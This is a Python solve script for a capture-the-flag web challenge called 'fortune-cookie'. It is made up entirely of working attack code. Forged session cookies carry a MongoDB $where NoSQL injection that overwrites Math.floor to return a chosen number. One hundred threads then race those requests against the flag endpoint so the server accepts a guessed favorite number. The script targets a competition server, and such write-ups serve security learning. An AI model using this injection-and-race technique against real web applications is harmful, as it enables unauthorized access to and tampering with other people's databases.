import requests
import threading

def overwrite_floor_func() :
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ko,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,la;q=0.5,und;q=0.4,lb;q=0.3,vi;q=0.2",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Cookie": 'user=s%3Aj%3A%7B%22%24where%22%3A%22(Math.floor%3Dfunction()%7Breturn%206969%7D)%26%260%22%7D.IoORcQjJrlGyo1KJ2%2BFpUOvvcNwJ6bTB4J2n%2FuoLtEw',
        "Host": "fortune-cookie.ctf.defenit.kr",
        "Pragma": "no-cache",
        "Referer": "http://fortune-cookie.ctf.defenit.kr/",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
    }
    cookies = {"user": 's%3Aj%3A%7B%22%24where%22%3A%22(Math.floor%3Dfunction()%7Breturn%206969%7D)%26%260%22%7D.IoORcQjJrlGyo1KJ2%2BFpUOvvcNwJ6bTB4J2n%2FuoLtEw'}
    print(requests.get("http://fortune-cookie.ctf.defenit.kr/posts", headers=headers, cookies=cookies))

def get_flag() :
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ko,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,la;q=0.5,und;q=0.4,lb;q=0.3,vi;q=0.2",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Cookie": "user=s%3Aj%3A%7B%22%24where%22%3A%22this.author%3D%3D%3D'zuuuzi'%22%7D.nmTSqk3He9NUQpTKov%2Bxivt9o%2F8fL6xG9e3LmSiJgfw",
        "Host": "fortune-cookie.ctf.defenit.kr",
        "Pragma": "no-cache",
        "Referer": "http://fortune-cookie.ctf.defenit.kr/",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
    }
    print(requests.get("http://fortune-cookie.ctf.defenit.kr/flag?favoriteNumber=6969", headers=headers).text)

th1, th2 = [], []

for i in range(100) :
    th1.append(threading.Thread(target=overwrite_floor_func, args=()))
    th2.append(threading.Thread(target=get_flag, args=()))

for i in range(100) :
    th1[i].start()

for i in range(100) :
    th2[i].start()